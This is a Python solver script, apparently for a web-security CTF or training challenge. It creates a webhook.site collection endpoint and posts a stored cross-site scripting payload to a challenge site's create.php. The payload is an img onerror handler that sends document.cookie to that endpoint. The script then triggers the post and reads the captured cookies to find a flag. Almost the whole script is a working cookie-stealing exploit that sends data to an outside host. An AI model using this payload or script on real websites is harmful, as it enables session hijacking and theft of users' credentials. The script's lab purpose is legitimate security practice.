import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite_uuid = self.get_webhooksite_uuid()
        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
        self.webhooksite_view_url = f"https://webhook.site/#!/view/{self.webhooksite_uuid}"
        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"

    def get_webhooksite_uuid(self):
        response = self.session.post("https://webhook.site/token")
        return response.json()["uuid"]

    def find_flag_webhooksite(self, delay_seconds=2):
        import time, json
        time.sleep(delay_seconds)
        response = self.session.get(self.webhooksite_requests_url)
        response_json = response.json()
        response_json_text = json.dumps(response_json, indent=2)
        find_flag(response_json_text)

    def main(self):
        BASE_URL = "https://closedlearning.quoccacorp.com"
        PAYLOAD = f'''<img src="x" onerror="document.location='{self.webhooksite_url}?q='.concat(document.cookie)">'''

        # WAF: Title cannot contain /
        response = self.session.post(f"{BASE_URL}/create.php", data={"title": "title", "content": PAYLOAD})

        post_url = response.url
        self.session.post(post_url)

        self.find_flag_webhooksite()

if __name__ == "__main__":
    Solver().main()
